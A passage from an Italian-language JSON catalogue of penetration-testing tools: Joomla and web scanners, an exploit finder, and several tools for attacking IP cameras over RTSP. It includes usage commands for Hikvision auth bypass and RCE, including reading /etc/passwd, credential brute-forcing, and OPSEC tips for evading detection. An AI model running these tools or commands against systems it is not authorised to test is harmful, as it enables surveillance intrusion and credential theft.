    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>JoomlaScan</strong> è uno scanner di sicurezza specializzato per il CMS Joomla, l'equivalente funzionale di WPScan per il mondo WordPress. È progettato per eseguire reconnaissance approfondita su installazioni Joomla, enumerando la versione del core attraverso analisi di file XML manifest, header HTTP e pattern specifici, identificando componenti ed estensioni di terze parti installati, e verificando l'esistenza di exploit noti per le versioni rilevate. Offre una panoramica completa della postura di sicurezza del CMS target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Method Version Detection:</strong> utilizza metodi euristici multipli per determinare la versione precisa del core Joomla analizzando file manifest XML, language files, changelog, README e meta tag generator, funzionando anche quando l'informazione è offuscata o rimossa.</p><p><strong>Component &amp; Extension Enumeration:</strong> scansiona path noti di componenti popolari (com_users, com_content, com_media, com_contact) e estensioni third-party, mappando la superficie d'attacco completa inclusi plugin, moduli e template installati.</p><p><strong>Vulnerability Correlation:</strong> correla versioni di core e componenti rilevati con database di vulnerabilità note, segnalando CVE applicabili e fornendo riferimenti a exploit pubblici per facilitare la fase di exploitation.</p><p><strong>Firewall &amp; WAF Detection:</strong> identifica la presenza di estensioni di sicurezza come RSFirewall, AdminTools o WAF esterni che potrebbero bloccare tentativi di exploitation, permettendo di adattare la strategia di attacco.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansione base di un sito Joomla\njoomlascan -u https://target.com\n\n# Enumerazione componenti aggressiva\njoomlascan -u https://target.com -ec\n\n# Con output verboso per debugging\njoomlascan -u https://target.com -v\n\n# Scansione attraverso proxy\njoomlascan -u https://target.com --proxy http://127.0.0.1:8080\n\n# Output in formato JSON\njoomlascan -u https://target.com -o json\n\n# Scan con timeout custom\njoomlascan -u https://target.com --timeout 30</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Joomla Security Assessment</strong>, condurre valutazione completa della sicurezza di installazioni Joomla identificando versioni obsolete del core, componenti vulnerabili e misconfigurazioni comuni.</p><p>Per <strong>Pre-Exploitation Reconnaissance</strong>, raccogliere intelligence critica prima di lanciare exploit, determinando se il target usa Joomla 3.x, 4.x o versioni precedenti e quali componenti sono installati.</p><p>Per <strong>Vulnerability Validation</strong>, verificare se vulnerabilità note sono applicabili al target specifico basandosi su versioni esatte rilevate dal tool.</p><p>Per <strong>Bug Bounty Hunting</strong>, identificare rapidamente installazioni Joomla vulnerabili durante reconnaissance su scope di programmi bug bounty.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> lo scanner esegue molte richieste GET a path specifici (file manifest, changelog, componenti) generando numerosi 404 nei log del server facilmente identificabili come pattern di scanning. WAF e plugin di sicurezza Joomla possono bloccare o rate-limitare le richieste. User-Agent default è riconoscibile. Usare throttling, proxy rotation e custom User-Agent per ridurre detection durante operazioni stealth.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Web",
      "CMS",
      "Joomla"
    ],
    "notes": null
  },
  {
    "id": "katana-linux-amd64",
    "name": "katana_linux_amd64",
    "version": "1.2.2",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/projectdiscovery/katana",
    "desc": "Crawler e spider web di nuova generazione per discovery approfondita di endpoint, file JS e parametri nascosti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Katana, sviluppato da ProjectDiscovery, e un crawler web di nuova generazione per le moderne Single Page Application. A differenza dei crawler tradizionali che parsano solo HTML statico, Katana integra un motore headless basato su Chrome che esegue il JavaScript delle pagine, intercettando richieste XHR, Fetch API e WebSocket. Questo e fondamentale per applicazioni React, Vue.js e Angular, dove la maggior parte delle rotte e degli endpoint non esistono nell'HTML iniziale ma vengono costruiti a runtime dal framework JavaScript.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Headless Browser Crawling:</strong> Usa Chrome controllato programmaticamente per navigare le pagine ed intercettare tutte le richieste di rete generate dal JavaScript. Scopre endpoint API, rotte interne e risorse dinamiche invisibili all'analisi statica. Supporta interazione con elementi della pagina per triggerare chiamate AJAX nascoste.</p><p><strong>JavaScript File Parsing:</strong> Analizza i file JS scaricati estraendo URL hardcoded, chiavi API, path di endpoint e configurazioni sensibili dal codice compilato, rivelando endpoint di staging, API interne e secret dimenticati nella build di produzione.</p><p><strong>Pipeline Integration:</strong> Progettato per l'ecosistema ProjectDiscovery. L'output si passa in pipe a httpx per verifica endpoint, Nuclei per vulnerability scanning o ParamSpider per estrazione parametri. Supporta JSON, CSV e filtri granulari per tipo di risorsa.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Binario Go standalone con sintassi intuitiva. Supporta input singolo, liste e stdin.</p><pre><code># Crawling base\nkatana -u https://target.com\n\n# Headless con estrazione JS e profondita 3\nkatana -u https://target.com -jc -headless -d 3\n\n# Con filtro scope e output JSON\nkatana -u https://target.com -fs fqdn -jsonl -o results.json\n\n# Da lista URL con parallelismo\nkatana -list urls.txt -c 20 -headless -jc\n\n# Pipeline: crawl + verifica + scan\nkatana -u https://target.com -jc | httpx -silent | nuclei -t cves/</code></pre><p>L'opzione -jc (JavaScript Crawl) dovrebbe essere sempre attivata per massimizzare la copertura.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Mappatura applicazioni moderne:</strong> Per applicazioni con framework JS moderni, il crawling tradizionale e insufficiente. Katana scopre tutte le rotte, endpoint API e file JS con informazioni sensibili, fornendo una mappa completa della superficie di attacco.</p><p><strong>Pipeline automatizzate:</strong> In workflow di bug bounty o assessment su larga scala, Katana alimenta tool di verifica (httpx), scanning (Nuclei) e fuzzing (ffuf), creando una catena automatizzata dalla ricognizione all'identificazione delle vulnerabilita.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il crawling headless genera molto piu traffico del crawling statico. Comporta l'esecuzione di script di tracciamento e analytics sul target che registrano l'attivita.</p><p><strong>Impatto operativo:</strong> Il motore headless consuma RAM e CPU significative. Su target con molte pagine, il crawling dura ore e genera gigabyte di traffico. Puo triggerare CAPTCHA e challenge anti-bot.</p><p><strong>Mitigazioni:</strong> Limitare profondita (-d) e parallelismo (-c). Usare filtro scope (-fs fqdn) per evitare link esterni. Considerare la modalita non-headless per ricognizione iniziale, riservando headless per target specifici.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Web",
      "Crawling",
      "Active"
    ],
    "notes": null
  },
  {
    "id": "findsploit-2-0",
    "name": "Findsploit",
    "version": "2.0",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/1N3/Findsploit",
    "desc": "Utility CLI per ricerca rapida di exploit in database locali (Exploit-DB) e online (PacketStorm, NVD) simultaneamente.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Findsploit</strong> e uno strumento a riga di comando che potenzia significativamente la ricerca di exploit rispetto al classico <code>searchsploit</code>. Mentre quest'ultimo interroga unicamente il database locale di Exploit-DB, Findsploit esegue query simultanee su molteplici repository online tra cui PacketStorm Security, il National Vulnerability Database (NVD) e CVE Details. Questo approccio ibrido consente di trovare Proof of Concept (PoC) recenti che potrebbero non essere ancora stati indicizzati nell'installazione locale di Kali Linux. Lo strumento e sviluppato in Bash ed e progettato per integrarsi nel workflow di un penetration tester che necessita di trovare rapidamente codice exploit funzionante durante la fase di exploitation.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Ricerca Multi-Database:</strong> Findsploit aggrega i risultati provenienti da Exploit-DB locale, PacketStorm e NVD in un'unica interfaccia. I risultati vengono presentati in formato tabellare con indicazione della fonte, del tipo di exploit (locale, remoto, webapps, DoS) e del linguaggio di programmazione. Questa aggregazione elimina la necessita di consultare manualmente ciascun database.</p><p><strong>Download e Compilazione Rapida:</strong> Una volta identificato l'exploit desiderato, Findsploit facilita il download diretto del codice sorgente nella directory di lavoro corrente. Per gli exploit in C o C++, suggerisce automaticamente i flag di compilazione necessari, riducendo il tempo di preparazione del payload da minuti a secondi.</p><p><strong>Integrazione con Nmap:</strong> Findsploit puo essere alimentato con l'output di scansioni Nmap per cercare automaticamente exploit corrispondenti ai servizi e alle versioni rilevate. Questo permette di passare dalla fase di ricognizione a quella di exploitation in modo semi-automatico, correlando i banner dei servizi con le vulnerabilita note.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lo strumento si utilizza dalla riga di comando con una sintassi molto semplice. E sufficiente specificare il nome del servizio, la versione o il numero CVE da cercare.</p><pre><code># Ricerca per nome servizio e versione\nfindsploit apache 2.4.49\n\n# Ricerca per identificativo CVE specifico\nfindsploit CVE-2024-1234\n\n# Ricerca generica per tecnologia\nfindsploit wordpress 5.0\n\n# Ricerca con filtro per tipo di exploit\nfindsploit openssh remote</code></pre><p>I risultati vengono presentati numerati. E possibile selezionare un exploit per numero per visualizzarne i dettagli o scaricarlo. Il database locale viene aggiornato tramite il comando <code>searchsploit -u</code> che Findsploit invoca automaticamente se rileva che l'ultimo aggiornamento risale a piu di una settimana.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la fase di <strong>Vulnerability Analysis</strong>, quando uno scanner come Nessus o OpenVAS riporta una CVE critica ma Metasploit non dispone di un modulo dedicato, Findsploit permette di trovare rapidamente script PoC in Python, Ruby o C da adattare manualmente all'ambiente target. E particolarmente utile per vulnerabilita recenti (zero-day o n-day) che non sono ancora integrate nei framework principali. In contesti CTF, velocizza enormemente la fase di ricerca dell'exploit corretto per un servizio esposto.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le query verso i database online (PacketStorm, NVD) generano traffico HTTP/HTTPS visibile nei log di rete. In ambienti con monitoraggio avanzato, le ricerche di exploit possono attivare alert specifici sui proxy aziendali o sui sistemi DLP che analizzano il contenuto delle richieste web.</p><p><strong>Impatto operativo:</strong> Scaricare ed eseguire exploit da fonti esterne comporta rischi significativi. Il codice potrebbe contenere backdoor, malware o comandi distruttivi non documentati. Un exploit non verificato potrebbe causare il crash del servizio target invece di garantire l'accesso, compromettendo l'intera operazione di penetration testing.</p><p><strong>Mitigazioni:</strong> Analizzare sempre il codice sorgente dell'exploit prima dell'esecuzione. Utilizzare ambienti sandbox per i test preliminari. Preferire exploit provenienti da fonti verificate e con commenti della community. Mantenere aggiornato il database locale per ridurre la necessita di query online durante gli engagement.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "cameradar-5-0-4",
    "name": "cameradar",
    "version": "5.0.4",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Ullaakut/cameradar",
    "desc": "Scanner specializzato per discovery e accesso a telecamere RTSP di sorveglianza, con bruteforce di credenziali e route.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Cameradar</strong> e uno strumento offensivo scritto in Go, progettato specificamente per l'accesso non autorizzato a flussi di videosorveglianza tramite il protocollo RTSP (Real Time Streaming Protocol). Lo strumento scansiona intere subnet alla ricerca di porte RTSP aperte (tipicamente 554 e 8554) e tenta sistematicamente di determinare il modello della telecamera, il percorso corretto dello stream video e le credenziali di accesso. Cameradar rappresenta una soluzione all-in-one per il testing della sicurezza dei sistemi di videosorveglianza, combinando discovery, fingerprinting e bruteforce in un unico workflow automatizzato.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Route Discovery Intelligente:</strong> Ogni produttore di telecamere utilizza percorsi RTSP diversi per esporre i flussi video (ad esempio <code>/live</code>, <code>/ch0/main</code>, <code>/h264/media.amp</code>, <code>/cam/realmonitor</code>). Cameradar include un database di migliaia di path noti, organizzati per vendor, e li testa sistematicamente per identificare quello corretto anche in assenza di credenziali valide. Questo approccio supera il problema principale dell'accesso RTSP: non basta conoscere IP e porta, serve anche il percorso esatto.</p><p><strong>Credential Bruteforcing Mirato:</strong> Lo strumento include liste di credenziali di default specifiche per i principali produttori di telecamere IP (Hikvision, Dahua, Axis, Bosch, Samsung, Panasonic). Queste liste sono molto piu efficaci di un bruteforce generico perche riflettono le password di fabbrica reali. Il motore di bruteforce supporta sia l'autenticazione Basic che Digest, gestendo automaticamente i challenge-response necessari.</p><p><strong>Output Strutturato e Validazione:</strong> Cameradar non si limita a trovare credenziali valide: verifica effettivamente che lo stream sia accessibile eseguendo una negoziazione RTSP completa (DESCRIBE, SETUP, PLAY). I risultati vengono esportati in formato JSON con dettagli su IP, porta, percorso, credenziali e thumbnail dello stream, facilitando la documentazione nei report di penetration testing.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lo strumento si utilizza da riga di comando specificando il target (singolo IP, range CIDR o file di host) e opzionalmente le porte da scansionare e le wordlist personalizzate.</p><pre><code># Scansione di una subnet con output JSON\ncameradar -t 192.168.1.0/24 -p 554,8554 --json-output results.json\n\n# Bruteforce su target specifico con wordlist custom\ncameradar -t 10.0.0.50 -u custom_users.txt -P custom_pass.txt\n\n# Scansione con timeout personalizzato per reti lente\ncameradar -t 172.16.0.0/16 -p 554 --timeout 5000\n\n# Utilizzo con Docker per evitare installazione\ndocker run --rm ullaakut/cameradar -t 192.168.1.0/24</code></pre><p>L'output JSON contiene per ogni telecamera trovata: indirizzo IP, porta, percorso dello stream, credenziali funzionanti (se trovate), tipo di autenticazione e un flag che indica se lo stream e effettivamente riproducibile.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nei <strong>Physical Security Assessment</strong>, Cameradar permette di dimostrare come un attaccante possa accedere alle telecamere interne per mappare i movimenti delle guardie, osservare codici digitati sui tastierini o identificare punti ciechi nella copertura video. Spesso le telecamere sono collocate su VLAN separate ma risultano accessibili per misconfigurazione del routing inter-VLAN. In contesti di <strong>Red Team</strong>, l'accesso ai flussi video fornisce intelligence operativa critica per pianificare l'accesso fisico agli edifici. Lo strumento e anche utilizzato per verificare la conformita alle policy aziendali che impongono il cambio delle credenziali di fabbrica su tutti i dispositivi IoT.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La scansione e molto rumorosa. I tentativi di connessione RTSP falliti vengono registrati nei log degli NVR (Network Video Recorder) e possono generare alert sui sistemi SIEM. Il volume di traffico generato dalla scansione di subnet ampie e facilmente distinguibile dal traffico legittimo e viene flaggato da IDS/IPS.</p><p><strong>Impatto operativo:</strong> Su dispositivi hardware datati o con firmware non aggiornato, un numero elevato di tentativi di connessione RTSP puo causare il blocco temporaneo del flusso video, il riavvio della telecamera o il crash del servizio di streaming. Questo potrebbe allertare il personale di sicurezza fisica che monitora i feed in tempo reale.</p><p><strong>Mitigazioni:</strong> Ridurre il numero di thread paralleli per minimizzare l'impatto sui dispositivi. Eseguire le scansioni durante le finestre di manutenzione concordate. Utilizzare le wordlist di default specifiche per vendor prima di passare a bruteforce generici per ridurre il numero totale di tentativi. Documentare tutti i dispositivi trovati vulnerabili per il report finale.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "hikpwn",
    "name": "HikPwn",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/4n4nk3/HikPwn",
    "desc": "Tool scanner ed exploit per telecamere Hikvision vulnerabili a bypass autenticazione (CVE-2017-7921) e command injection.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>HikPwn</strong> e uno strumento offensivo Python mirato specificamente ai dispositivi di videosorveglianza prodotti da Hikvision, uno dei maggiori produttori mondiali di telecamere IP. Lo strumento automatizza la rilevazione e lo sfruttamento di vulnerabilita critiche note in questi dispositivi, in particolare la CVE-2017-7921 (bypass dell'autenticazione tramite manipolazione dell'URL) e la CVE-2021-36260 (command injection che permette l'esecuzione remota di codice). HikPwn e in grado di estrarre snapshot video, configurazioni utente complete e decifrare le password memorizzate nella configurazione del dispositivo, fornendo un accesso completo al sistema di videosorveglianza senza necessita di credenziali valide.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Authentication Bypass (CVE-2017-7921):</strong> Questa vulnerabilita permette di accedere a endpoint protetti del dispositivo semplicemente modificando i parametri dell'URL. HikPwn verifica automaticamente se il dispositivo e vulnerabile e, in caso positivo, scarica la lista completa degli utenti configurati con i rispettivi hash delle password. Il bug risiede in un controllo di autenticazione improprio che puo essere aggirato inviando richieste HTTP appositamente costruite agli endpoint <code>/System/configurationFile</code> e <code>/Security/users</code>.</p><p><strong>Configuration Decryptor:</strong> I dispositivi Hikvision memorizzano le credenziali in file di configurazione cifrati con un algoritmo proprietario debole. HikPwn include un modulo dedicato che scarica il file di configurazione completo dal dispositivo vulnerabile e lo decifra offline, rivelando le password in chiaro di tutti gli utenti configurati, compreso l'amministratore. Questo modulo funziona anche su modelli recenti che utilizzano la cifratura AES con chiave hardcoded nel firmware.</p><p><strong>Remote Code Execution (CVE-2021-36260):</strong> Per i dispositivi vulnerabili alla command injection, HikPwn puo eseguire comandi arbitrari sul sistema operativo embedded della telecamera. Questo permette di ottenere una shell interattiva, installare strumenti di pivoting o modificare la configurazione del dispositivo per mantenere l'accesso persistente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lo strumento e uno script Python standalone che richiede la libreria <code>requests</code>. Si utilizza specificando l'indirizzo IP del target e il tipo di exploit da eseguire.</p><pre><code># Scansione di un range IP per dispositivi Hikvision vulnerabili\npython3 hikpwn.py -t 192.168.1.0/24 --scan\n\n# Estrazione lista utenti tramite auth bypass\npython3 hikpwn.py -t 192.168.1.50 --exploit users\n\n# Download e decifratura file di configurazione\npython3 hikpwn.py -t 192.168.1.50 --exploit config --decrypt\n\n# Esecuzione comando remoto via command injection\npython3 hikpwn.py -t 192.168.1.50 --rce \"cat /etc/passwd\"</code></pre><p>L'output include i dettagli del dispositivo (modello, versione firmware, numero seriale), la lista degli utenti con le password decifrate e, nel caso dell'RCE, l'output del comando eseguito. I risultati possono essere salvati in formato JSON per la documentazione.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Negli <strong>IoT Security Assessment</strong>, le telecamere Hikvision rappresentano spesso il punto di ingresso piu debole in una rete aziendale. HikPwn permette di dimostrare come un attaccante possa prendere il controllo completo del sistema di videosorveglianza senza conoscere alcuna password. In scenari di <strong>Red Team</strong>, l'accesso alle telecamere fornisce intelligence visiva sugli ambienti fisici e puo essere utilizzato come punto di pivot per raggiungere altri segmenti di rete, dato che spesso i dispositivi IoT sono collegati a VLAN con regole di routing permissive. Lo strumento e anche utilizzato per verificare che i firmware siano stati aggiornati dopo la pubblicazione degli advisory di sicurezza.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le richieste HTTP malformate agli endpoint <code>/System/deviceInfo</code>, <code>/Security/users</code> e <code>/System/configurationFile</code> vengono registrate nei log del dispositivo e sono facilmente identificabili. I tentativi di command injection generano pattern anomali nei log del web server embedded. Alcuni modelli recenti inviano notifiche push all'applicazione mobile Hik-Connect quando rilevano tentativi di accesso sospetti.</p><p><strong>Impatto operativo:</strong> Lo sfruttamento della CVE-2021-36260 per l'esecuzione di comandi puo causare instabilita del dispositivo, riavvii inaspettati o corruzione del firmware. Su dispositivi con risorse limitate, l'esecuzione di comandi pesanti puo bloccare il flusso video e allertare gli operatori di sicurezza fisica che monitorano i feed in tempo reale.</p><p><strong>Mitigazioni:</strong> Eseguire prima la scansione non distruttiva (solo enumerazione utenti) prima di tentare l'RCE. Coordinare i test con il team di sicurezza fisica per evitare falsi allarmi. Documentare la versione firmware di ogni dispositivo testato per correlare i risultati con gli advisory di sicurezza pubblicati dal vendor.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "rtsp-routes-wordlist",
    "name": "routes_wordlist.txt",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Wordlist specializzata contenente path di API, endpoint e route di framework moderni (Rails, Django, Spring) per discovery.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><code>routes_wordlist.txt</code> e una wordlist specializzata contenente percorsi RTSP (Real Time Streaming Protocol) utilizzati dai principali produttori di telecamere IP e dispositivi di videosorveglianza. A differenza delle wordlist generiche di directory web, questa lista e focalizzata esclusivamente sui path specifici del protocollo RTSP che i diversi vendor utilizzano per esporre i flussi video delle loro telecamere. La conoscenza del percorso corretto e fondamentale per accedere a uno stream RTSP, poiche ogni produttore (Hikvision, Dahua, Axis, Bosch, Samsung, Panasonic, Vivotek) utilizza convenzioni diverse e spesso non documentate pubblicamente. Questa wordlist raccoglie migliaia di percorsi verificati, organizzati per vendor e modello.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Copertura Multi-Vendor:</strong> La wordlist include percorsi per oltre 50 produttori di telecamere IP, dagli economici dispositivi cinesi ai sistemi enterprise di sorveglianza. I percorsi coprono sia i flussi principali (alta risoluzione) che quelli secondari (bassa risoluzione, utilizzati per il monitoraggio mobile), nonche i percorsi di accesso ai canali multipli degli NVR (Network Video Recorder) che gestiscono decine di telecamere simultaneamente.</p><p><strong>Pattern e Varianti:</strong> Per ogni vendor, la lista include le varianti storiche dei percorsi che sono cambiate tra le diverse generazioni di firmware. Ad esempio, per Hikvision sono presenti sia il vecchio formato <code>/PSIA/streaming/channels/101</code> che il nuovo <code>/Streaming/Channels/101</code>. Questa completezza e essenziale perche dispositivi con firmware datato potrebbero rispondere solo ai vecchi endpoint.</p><p><strong>Integrazione con Tool di Scanning:</strong> La wordlist e formattata con un percorso per riga, compatibile con tutti i principali strumenti di bruteforce RTSP come Cameradar, rtsp_authgrinder e script custom. Puo essere utilizzata anche con strumenti generici come Nmap (con script NSE rtsp-url-brute) specificandola come dizionario personalizzato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>La wordlist viene utilizzata come input per strumenti di discovery e bruteforce RTSP. Si specifica come parametro di percorso nei vari tool disponibili.</p><pre><code># Utilizzo con Cameradar\ncameradar -t 192.168.1.0/24 -r routes_wordlist.txt\n\n# Utilizzo con ffuf per bruteforce del path\nffuf -u rtsp://192.168.1.50:554/FUZZ -w routes_wordlist.txt -mc all\n\n# Utilizzo con Nmap NSE script\nnmap -p 554 --script rtsp-url-brute --script-args rtsp-url-brute.urlfile=routes_wordlist.txt 192.168.1.0/24\n\n# Utilizzo con script Python custom\npython3 rtsp_checker.py -t 10.0.0.50 -w routes_wordlist.txt</code></pre><p>Per massimizzare l'efficacia, si consiglia di ordinare la wordlist mettendo in cima i percorsi del vendor identificato durante la fase di fingerprinting (tramite banner RTSP o header HTTP dell'interfaccia web della telecamera).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel contesto di un <strong>Physical Security Assessment</strong>, la wordlist e fondamentale quando si conosce l'indirizzo IP di una telecamera ma non il percorso dello stream video. Senza il percorso corretto, anche le credenziali valide non permettono di accedere al flusso. In scenari di <strong>IoT Penetration Testing</strong>, questa risorsa accelera drasticamente la fase di discovery permettendo di enumerare i flussi accessibili su decine o centinaia di dispositivi in pochi minuti. E particolarmente utile quando il vendor non e immediatamente identificabile e si deve procedere per tentativi sistematici.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il bruteforce dei percorsi RTSP genera un volume significativo di richieste DESCRIBE verso il dispositivo. Ogni percorso errato produce una risposta 404 o 451 che viene registrata nei log del servizio RTSP. Dispositivi con firmware recente possono implementare rate limiting o blocco temporaneo dell'IP sorgente dopo un numero elevato di richieste fallite.</p><p><strong>Impatto operativo:</strong> La wordlist completa contiene migliaia di entry. Testare tutti i percorsi su dispositivi con hardware limitato (telecamere economiche, DVR datati) puo saturare il servizio RTSP causando il blocco temporaneo dello streaming per tutti gli utenti legittimi collegati al dispositivo.</p><p><strong>Mitigazioni:</strong> Eseguire prima il fingerprinting del vendor tramite l'interfaccia web o il banner RTSP, poi filtrare la wordlist per includere solo i percorsi del produttore identificato. Utilizzare delay tra le richieste per evitare il sovraccarico dei dispositivi. Coordinare i test con il personale responsabile della videosorveglianza per evitare interruzioni del servizio durante orari critici.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "rtsp-authgrinder",
    "name": "rtsp_authgrinder",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/tektengu/rtsp_authgrinder",
    "desc": "Bruteforcer puro per protocollo RTSP, focalizzato sulla velocità di test delle credenziali su servizi già identificati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>rtsp_authgrinder</strong> e uno strumento dedicato esclusivamente alla fase di credential cracking su servizi RTSP (Real Time Streaming Protocol). A differenza degli scanner che combinano discovery e bruteforce, questo tool assume che il target (indirizzo IP, porta e percorso dello stream) sia gia noto e si concentra esclusivamente sull'attacco alle credenziali di autenticazione. E scritto per essere leggero, veloce e resiliente, con una gestione intelligente delle disconnessioni tipiche dei dispositivi IoT instabili. Lo strumento supporta wordlist personalizzate sia per gli username che per le password e viene frequentemente utilizzato in catena con tool di discovery come Cameradar o Nmap.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Dictionary Attack Ottimizzato:</strong> Lo strumento itera sistematicamente tutte le combinazioni possibili di username e password fornite nelle wordlist contro il servizio RTSP del target. L'implementazione e ottimizzata per ridurre l'overhead di connessione, riutilizzando le sessioni TCP quando possibile e minimizzando i round-trip necessari per ogni tentativo. Supporta sia l'autenticazione Basic (credenziali in Base64) che Digest (challenge-response con hash MD5).</p><p><strong>Gestione Errori e Resilienza:</strong> I dispositivi IoT come telecamere e DVR sono noti per la loro instabilita di rete: connessioni che cadono, timeout improvvisi, servizi che si riavviano sotto carico. rtsp_authgrinder gestisce intelligentemente queste situazioni, distinguendo tra una disconnessione causata da credenziali errate e una causata da problemi di rete. Nel secondo caso, il tool riprova automaticamente le stesse credenziali dopo un breve delay, evitando di perdere tentativi validi.</p><p><strong>Reporting Dettagliato:</strong> Al termine dell'attacco, lo strumento genera un report che include le credenziali trovate, il numero totale di tentativi effettuati, il tempo impiegato e il tasso di successo. In caso di credenziali valide, verifica anche che lo stream sia effettivamente accessibile eseguendo una negoziazione RTSP completa fino alla fase PLAY.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lo strumento si utilizza da riga di comando specificando il target, la porta e le wordlist per username e password. E possibile configurare il numero di thread paralleli e i timeout di connessione.</p><pre><code># Attacco base con wordlist separate per user e password\n./rtsp_authgrinder -t 192.168.1.10 -p 554 -U users.txt -P passwords.txt\n\n# Attacco con path specifico e timeout personalizzato\n./rtsp_authgrinder -t 192.168.1.10 -p 554 -U users.txt -P passwords.txt --path /live --timeout 5\n\n# Attacco multi-thread per velocizzare il processo\n./rtsp_authgrinder -t 192.168.1.10 -p 554 -U users.txt -P passwords.txt --threads 10\n\n# Attacco con output su file per documentazione\n./rtsp_authgrinder -t 192.168.1.10 -p 554 -U users.txt -P passwords.txt -o results.txt</code></pre><p>Si consiglia di utilizzare wordlist specifiche per il vendor della telecamera identificato durante la fase di fingerprinting, piuttosto che dizionari generici, per ridurre significativamente il tempo necessario.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In scenari di <strong>Penetration Testing mirato</strong>, quando durante la fase di discovery viene identificata una telecamera che sorveglia un'area critica (sala server, ingresso principale, caveau), rtsp_authgrinder permette di eseguire un attacco esaustivo alle credenziali per tentare di ottenere l'accesso al flusso video. La gestione robusta degli errori lo rende preferibile a strumenti generici come Hydra quando si lavora su connessioni instabili tipiche dei dispositivi IoT economici. E anche utilizzato in <strong>Compliance Audit</strong> per verificare la robustezza delle password configurate sui dispositivi di videosorveglianza rispetto alle policy aziendali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Lo strumento genera un volume elevato di log \"Authentication Failed\" sul dispositivo target. I sistemi di videosorveglianza enterprise (Milestone, Genetec) possono correlare questi eventi e generare alert automatici. Alcuni dispositivi implementano meccanismi di lockout temporaneo dell'account dopo un numero configurabile di tentativi falliti, anche se questa funzionalita e rara sui dispositivi IoT economici.</p><p><strong>Impatto operativo:</strong> Un attacco bruteforce intensivo puo saturare le risorse limitate del dispositivo target, causando il degrado o l'interruzione del flusso video per gli utenti legittimi. Su dispositivi particolarmente datati, il sovraccarico puo provocare il riavvio del servizio RTSP o dell'intero dispositivo, causando un'interruzione visibile nel monitoraggio di sicurezza fisica.</p><p><strong>Mitigazioni:</strong> Limitare il numero di thread paralleli per ridurre l'impatto sul dispositivo. Utilizzare wordlist ridotte e mirate al vendor specifico prima di passare a dizionari estesi. Eseguire gli attacchi durante finestre di manutenzione concordate con il team di sicurezza fisica. Monitorare lo stato del flusso video durante l'attacco per interrompere immediatamente in caso di disservizio.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "rtsp-crack-1-0-3",
    "name": "rtsp_crack",
    "version": "1.0.3",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Tool semplice per testare credenziali di default e comuni su stream RTSP, utile per verifiche rapide di misconfigurazione.",
